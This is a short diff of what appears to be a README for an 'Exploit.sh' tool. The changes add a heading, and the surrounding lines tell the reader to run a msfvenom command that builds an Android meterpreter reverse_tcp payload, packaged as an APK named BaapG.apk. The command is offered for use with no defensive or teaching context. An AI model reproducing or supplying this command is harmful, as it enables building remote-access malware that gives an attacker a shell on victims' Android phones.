@@ -8,8 +8,8 @@
      bash Exploit.sh
 
 ----------------------------------------------------------------------------------------------------------------------------------
-
-
+After Install 👇
+----------------------------------------------------------------------------------------------------------------------------------
      After Install Metasploit Use This Cmd For Make App👇
 
      msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -a dalvik --platform android R > /sdcard/BaapG.apk
